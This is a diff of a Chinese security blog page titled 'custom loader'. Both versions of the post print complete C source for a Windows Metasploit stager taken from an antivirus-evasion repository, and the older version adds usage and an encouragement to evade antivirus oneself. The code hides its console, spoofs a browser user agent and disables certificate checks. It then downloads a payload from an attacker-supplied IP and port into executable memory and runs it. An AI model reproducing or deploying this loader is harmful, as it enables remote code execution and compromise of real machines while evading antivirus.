@@ -23,14 +23,12 @@
 <body>
 <main class="content">
   <section class="outer">
-  
+  <article id="post-custom-loader" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
 
-<article id="post-custom-loader" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
-  
-  <div class="article-inner">
-    
-      <header class="article-header">
+    <div class="article-inner">
         
+            <header class="article-header">
+                
   
     <h1 class="article-title" itemprop="name">
       custom loader
@@ -41,50 +39,50 @@
 
 
 
-      </header>
-    
+            </header>
+            
 
-    
-      <div class="article-meta">
-        <a href="/2019/02/03/custom-loader/" class="article-date">
+                
+                    <div class="article-meta">
+                        <a href="/2019/02/03/custom-loader/" class="article-date">
   <time datetime="2019-02-03T10:41:39.000Z" itemprop="datePublished">2019-02-03</time>
 </a>
-        
-      </div>
-    
+                            
+                    </div>
+                    
 
-    
-      
-
-
+                        
+                            
 
 
-    
-
-    <div class="article-entry" itemprop="articleBody">
-      
 
 
-      
+                                
 
-      
-        <p>custom loader demo<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">来自：https://github.com/peacand/msf-av-escape/blob/master/reverse_https/main_https.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;wininet.h&gt;</span><br><span class="line"></span><br><span class="line">#define HTTP_OPEN_FLAGS 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000</span><br><span class="line">/*</span><br><span class="line">  ;0x80000000 | ; INTERNET_FLAG_RELOAD</span><br><span class="line">  ;0x04000000 | ; INTERNET_NO_CACHE_WRITE</span><br><span class="line">  ;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION</span><br><span class="line">  ;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT</span><br><span class="line">  ;0x00000200 | ; INTERNET_FLAG_NO_UI</span><br><span class="line">  ;0x00800000 | ; INTERNET_FLAG_SECURE</span><br><span class="line">  ;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</span><br><span class="line">  ;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#define OPTIONS_SECURITY_FLAGS 0x00003380 </span><br><span class="line">/*</span><br><span class="line">	;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID</span><br><span class="line">	;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID</span><br><span class="line">	;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE</span><br><span class="line">	;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA</span><br><span class="line">	;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">int main(int argc, char * argv[]) &#123;</span><br><span class="line">	char * stage;</span><br><span class="line">	void(*stage_main)();</span><br><span class="line">	HINTERNET hInternet;</span><br><span class="line">	HINTERNET hHttpSession;</span><br><span class="line">	HINTERNET hHttpRequest;</span><br><span class="line">	int httpflags = OPTIONS_SECURITY_FLAGS;</span><br><span class="line">	int recv_tmp = 0, recv_tot = 0;</span><br><span class="line">	char *stage_index = NULL;</span><br><span class="line"></span><br><span class="line">	/* We dont want the console prompt at screen */</span><br><span class="line">	FreeConsole();</span><br><span class="line"></span><br><span class="line">	/* Even it its SSL encrypted, lets set a User Agent, looks better :-) */</span><br><span class="line">	hInternet = InternetOpen(&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)&quot;, 0, NULL, NULL, 0);</span><br><span class="line">	hHttpSession = InternetConnect(hInternet, argv[1], atoi(argv[2]), NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);</span><br><span class="line">	/* URL format is *important*, don&apos;t change it ! It tells what kind of payload (Native, Python, Java ..) is going to be injected afterwords */</span><br><span class="line">	hHttpRequest = HttpOpenRequest(hHttpSession, &quot;GET&quot;, &quot;/1f7MA&quot;, &quot;HTTP/1.1&quot;, NULL, NULL, HTTP_OPEN_FLAGS, 0);</span><br><span class="line">	/* Set SSL options to the HTTP request */</span><br><span class="line">	InternetSetOption(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &amp;httpflags, 4);</span><br><span class="line">	HttpSendRequest(hHttpRequest, NULL, 0, NULL, 0);</span><br><span class="line"></span><br><span class="line">	/* We got the payload, lets allocate a big chunk of memory in RWX to put the whole thing in */</span><br><span class="line">	stage = VirtualAlloc(0, 0x00400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	/* Read the payload from the previous http request and put it in our buffer */</span><br><span class="line">	recv_tmp = 1;</span><br><span class="line">	recv_tot = 0;</span><br><span class="line">	stage_index = stage;</span><br><span class="line"></span><br><span class="line">	while (recv_tmp &gt; 0) &#123;</span><br><span class="line">		InternetReadFile(hHttpRequest, stage_index, 8192, (PDWORD)&amp;recv_tmp);</span><br><span class="line">		recv_tot += recv_tmp;</span><br><span class="line">		stage_index += recv_tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Just jump at the beginning of the buffer */</span><br><span class="line">	stage_main = (void(*)())stage;</span><br><span class="line">	stage_main();</span><br><span class="line"></span><br><span class="line">	/* We dont have to care about it, but anyway .. */</span><br><span class="line">	InternetCloseHandle(hHttpSession);</span><br><span class="line">	InternetCloseHandle(hInternet);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>自行编译<br>Usage：xxoo.exe ip port<br><img src="https://s2.ax1x.com/2019/02/04/kGL2z8.png" alt=""><br><img src="https://s2.ax1x.com/2019/02/04/kGLGI1.png" alt=""></p>
-<h3 id="什么，你说过不了杀毒？-自己动手做咯，又不难～"><a href="#什么，你说过不了杀毒？-自己动手做咯，又不难～" class="headerlink" title="什么，你说过不了杀毒？ 自己动手做咯，又不难～"></a>什么，你说过不了杀毒？ 自己动手做咯，又不难～</h3>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://life-time.me/2019/02/03/custom-loader/" data-id="ck66ir7ud000014dkqw16uf08"
-         class="article-share-link">分享</a>
-      
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <p>https loader<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">来自：https://github.com/peacand/msf-av-escape/blob/master/reverse_https/main_https.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;wininet.h&gt;</span><br><span class="line"></span><br><span class="line">#define HTTP_OPEN_FLAGS 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000</span><br><span class="line">/*</span><br><span class="line">  ;0x80000000 | ; INTERNET_FLAG_RELOAD</span><br><span class="line">  ;0x04000000 | ; INTERNET_NO_CACHE_WRITE</span><br><span class="line">  ;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION</span><br><span class="line">  ;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT</span><br><span class="line">  ;0x00000200 | ; INTERNET_FLAG_NO_UI</span><br><span class="line">  ;0x00800000 | ; INTERNET_FLAG_SECURE</span><br><span class="line">  ;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</span><br><span class="line">  ;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#define OPTIONS_SECURITY_FLAGS 0x00003380 </span><br><span class="line">/*</span><br><span class="line">	;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID</span><br><span class="line">	;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID</span><br><span class="line">	;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE</span><br><span class="line">	;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA</span><br><span class="line">	;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">int main(int argc, char * argv[]) &#123;</span><br><span class="line">	char * stage;</span><br><span class="line">	void(*stage_main)();</span><br><span class="line">	HINTERNET hInternet;</span><br><span class="line">	HINTERNET hHttpSession;</span><br><span class="line">	HINTERNET hHttpRequest;</span><br><span class="line">	int httpflags = OPTIONS_SECURITY_FLAGS;</span><br><span class="line">	int recv_tmp = 0, recv_tot = 0;</span><br><span class="line">	char *stage_index = NULL;</span><br><span class="line"></span><br><span class="line">	/* We dont want the console prompt at screen */</span><br><span class="line">	FreeConsole();</span><br><span class="line"></span><br><span class="line">	/* Even it its SSL encrypted, lets set a User Agent, looks better :-) */</span><br><span class="line">	hInternet = InternetOpen(&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)&quot;, 0, NULL, NULL, 0);</span><br><span class="line">	hHttpSession = InternetConnect(hInternet, argv[1], atoi(argv[2]), NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);</span><br><span class="line">	/* URL format is *important*, don&apos;t change it ! It tells what kind of payload (Native, Python, Java ..) is going to be injected afterwords */</span><br><span class="line">	hHttpRequest = HttpOpenRequest(hHttpSession, &quot;GET&quot;, &quot;/1f7MA&quot;, &quot;HTTP/1.1&quot;, NULL, NULL, HTTP_OPEN_FLAGS, 0);</span><br><span class="line">	/* Set SSL options to the HTTP request */</span><br><span class="line">	InternetSetOption(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &amp;httpflags, 4);</span><br><span class="line">	HttpSendRequest(hHttpRequest, NULL, 0, NULL, 0);</span><br><span class="line"></span><br><span class="line">	/* We got the payload, lets allocate a big chunk of memory in RWX to put the whole thing in */</span><br><span class="line">	stage = VirtualAlloc(0, 0x00400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	/* Read the payload from the previous http request and put it in our buffer */</span><br><span class="line">	recv_tmp = 1;</span><br><span class="line">	recv_tot = 0;</span><br><span class="line">	stage_index = stage;</span><br><span class="line"></span><br><span class="line">	while (recv_tmp &gt; 0) &#123;</span><br><span class="line">		InternetReadFile(hHttpRequest, stage_index, 8192, (PDWORD)&amp;recv_tmp);</span><br><span class="line">		recv_tot += recv_tmp;</span><br><span class="line">		stage_index += recv_tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Just jump at the beginning of the buffer */</span><br><span class="line">	stage_main = (void(*)())stage;</span><br><span class="line">	stage_main();</span><br><span class="line"></span><br><span class="line">	/* We dont have to care about it, but anyway .. */</span><br><span class="line">	InternetCloseHandle(hHttpSession);</span><br><span class="line">	InternetCloseHandle(hInternet);</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://life-time.me/2019/02/03/custom-loader/" data-id="ck7rn7f1s0000xgdk1fuehx9f" class="article-share-link">
+                                            分享
+                                        </a>
+                                        
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/loader/">loader</a></li></ul>
 
-    </footer>
+                                    </footer>
 
-  </div>
+    </div>
 
-  
     
+        
   <nav class="article-nav">
     
       <a href="/2019/05/21/mysql_udf_sys_bineval/" class="article-nav-link">
@@ -97,24 +95,22 @@
       </a>
     
     
-      <a href="/2018/09/16/wmiexec/" class="article-nav-link">
+      <a href="/2018/04/18/ssr/" class="article-nav-link">
         <strong class="article-nav-caption">后一篇</strong>
-        <div class="article-nav-title">wmiexec</div>
+        <div class="article-nav-title">SSR</div>
       </a>
     
   </nav>
 
 
-  
+            
 
-  
-    
-  
+                
+                    
+                        
+                            
 
 </article>
-
-
-
 </section>
   <footer class="footer">
   <div class="outer">
@@ -147,15 +143,19 @@
   <ul class="nav nav-main">
     
       <li class="nav-item">
-        <a class="nav-item-link" href="/">主页</a>
+        <a class="nav-item-link" href="/">Home</a>
       </li>
     
       <li class="nav-item">
-        <a class="nav-item-link" href="/archives">归档</a>
+        <a class="nav-item-link" href="/archives">Archives</a>
       </li>
     
       <li class="nav-item">
-        <a class="nav-item-link" href="/about">关于</a>
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/links">Links</a>
       </li>
     
     <li class="nav-item">
@@ -188,6 +188,7 @@
   <div id="local-search-result" class="local-search-result"></div>
 </div>
 </div>
+
 </aside>
 <script src="/js/jquery-2.0.3.min.js"></script>
 <script src="/js/jquery.justifiedGallery.min.js"></script>
